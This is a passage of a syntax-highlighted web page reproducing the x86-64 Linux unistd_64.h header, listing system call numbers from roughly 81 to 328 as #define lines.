80</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fchdir 81</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rename 82</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mkdir 83</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rmdir 84</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_creat 85</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_link 86</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_unlink 87</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_symlink 88</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_readlink 89</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_chmod 90</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fchmod 91</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_chown 92</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fchown 93</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lchown 94</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_umask 95</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_gettimeofday 96</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getrlimit 97</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getrusage 98</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sysinfo 99</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_times 100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ptrace 101</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getuid 102</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_syslog 103</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getgid 104</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setuid 105</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setgid 106</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_geteuid 107</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getegid 108</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setpgid 109</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getppid 110</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getpgrp 111</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setsid 112</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setreuid 113</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setregid 114</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getgroups 115</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setgroups 116</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setresuid 117</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getresuid 118</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setresgid 119</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getresgid 120</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getpgid 121</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setfsuid 122</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setfsgid 123</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getsid 124</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_capget 125</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_capset 126</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigpending 127</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigtimedwait 128</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigqueueinfo 129</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigsuspend 130</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sigaltstack 131</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_utime 132</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mknod 133</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_uselib 134</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_personality 135</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ustat 136</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_statfs 137</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fstatfs 138</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sysfs 139</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getpriority 140</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setpriority 141</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_setparam 142</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_getparam 143</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_setscheduler 144</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_getscheduler 145</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_get_priority_max 146</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_get_priority_min 147</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_rr_get_interval 148</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mlock 149</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_munlock 150</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mlockall 151</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_munlockall 152</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_vhangup 153</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_modify_ldt 154</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pivot_root 155</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR__sysctl 156</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_prctl 157</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_arch_prctl 158</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_adjtimex 159</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setrlimit 160</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_chroot 161</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sync 162</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_acct 163</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_settimeofday 164</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mount 165</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_umount2 166</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_swapon 167</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_swapoff 168</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_reboot 169</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sethostname 170</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setdomainname 171</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_iopl 172</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ioperm 173</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_create_module 174</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_init_module 175</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_delete_module 176</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_get_kernel_syms 177</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_query_module 178</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_quotactl 179</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_nfsservctl 180</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getpmsg 181</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_putpmsg 182</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_afs_syscall 183</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_tuxcall 184</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_security 185</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_gettid 186</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_readahead 187</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setxattr 188</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lsetxattr 189</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fsetxattr 190</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getxattr 191</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lgetxattr 192</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fgetxattr 193</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_listxattr 194</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_llistxattr 195</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_flistxattr 196</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_removexattr 197</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lremovexattr 198</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fremovexattr 199</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_tkill 200</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_time 201</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_futex 202</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_setaffinity 203</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_getaffinity 204</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_set_thread_area 205</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_io_setup 206</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_io_destroy 207</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_io_getevents 208</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_io_submit 209</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_io_cancel 210</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_get_thread_area 211</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lookup_dcookie 212</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_epoll_create 213</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_epoll_ctl_old 214</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_epoll_wait_old 215</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_remap_file_pages 216</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getdents64 217</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_set_tid_address 218</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_restart_syscall 219</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_semtimedop 220</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fadvise64 221</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timer_create 222</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timer_settime 223</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timer_gettime 224</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timer_getoverrun 225</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timer_delete 226</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_clock_settime 227</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_clock_gettime 228</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_clock_getres 229</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_clock_nanosleep 230</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_exit_group 231</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_epoll_wait 232</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_epoll_ctl 233</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_tgkill 234</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_utimes 235</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_vserver 236</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mbind 237</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_set_mempolicy 238</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_get_mempolicy 239</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mq_open 240</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mq_unlink 241</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mq_timedsend 242</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mq_timedreceive 243</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mq_notify 244</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mq_getsetattr 245</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_kexec_load 246</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_waitid 247</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_add_key 248</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_request_key 249</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_keyctl 250</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ioprio_set 251</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ioprio_get 252</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_inotify_init 253</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_inotify_add_watch 254</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_inotify_rm_watch 255</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_migrate_pages 256</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_openat 257</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mkdirat 258</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mknodat 259</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fchownat 260</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_futimesat 261</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_newfstatat 262</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_unlinkat 263</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_renameat 264</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_linkat 265</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_symlinkat 266</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_readlinkat 267</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fchmodat 268</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_faccessat 269</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pselect6 270</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ppoll 271</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_unshare 272</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_set_robust_list 273</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_get_robust_list 274</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_splice 275</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_tee 276</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sync_file_range 277</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_vmsplice 278</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_move_pages 279</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_utimensat 280</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_epoll_pwait 281</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_signalfd 282</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timerfd_create 283</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_eventfd 284</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fallocate 285</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timerfd_settime 286</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timerfd_gettime 287</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_accept4 288</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_signalfd4 289</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_eventfd2 290</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_epoll_create1 291</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_dup3 292</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pipe2 293</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_inotify_init1 294</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_preadv 295</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pwritev 296</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_tgsigqueueinfo 297</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_perf_event_open 298</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_recvmmsg 299</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fanotify_init 300</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fanotify_mark 301</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_prlimit64 302</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_name_to_handle_at 303</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_open_by_handle_at 304</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_clock_adjtime 305</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_syncfs 306</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sendmmsg 307</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setns 308</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getcpu 309</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_process_vm_readv 310</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_process_vm_writev 311</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_kcmp 312</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_finit_module 313</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_setattr 314</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_getattr 315</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_renameat2 316</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_seccomp 317</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getrandom 318</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_memfd_create 319</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_kexec_file_load 320</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_bpf 321</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_execveat 322</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_userfaultfd 323</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_membarrier 324</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mlock2 325</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_copy_file_range 326</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_preadv2 327</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pwritev2 328</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* _ASM_X86_UNISTD_64_H */</span></span></span><br></pre></td></tr></table></figure></div>
]]></content>
  </entry>
</search>
